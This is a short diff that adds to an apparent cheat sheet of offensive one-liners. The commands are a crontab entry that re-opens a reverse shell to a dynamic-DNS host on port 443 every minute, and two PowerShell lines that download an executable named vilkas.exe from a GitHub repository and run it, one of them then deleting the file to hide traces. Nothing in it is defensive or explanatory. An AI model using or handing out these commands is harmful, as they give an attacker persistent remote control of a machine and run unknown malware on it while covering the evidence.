@@ -1,1 +1,8 @@
+One Liner Shell:
 echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/decoderx.ddns.net/443 0>&1'" | crontab -
+
+Download, Execute:
+PowerShell (New-Object System.Net.WebClient).DownloadFile('https://github.com/dec0derx/exec/raw/main/vilkas.exe', 'vilkas.exe');Start-Process -NoNewWindow -FilePath "vilkas.exe"<br
+
+Download, Execute, Sleep, Delete
+PowerShell (New-Object System.Net.WebClient).DownloadFile('https://github.com/dec0derx/exec/raw/main/vilkas.exe', 'vilkas.exe');Start-Process -NoNewWindow -FilePath 'vilkas.exe';Start-Sleep -s 10;Remove-Item -path 'vilkas.exe'
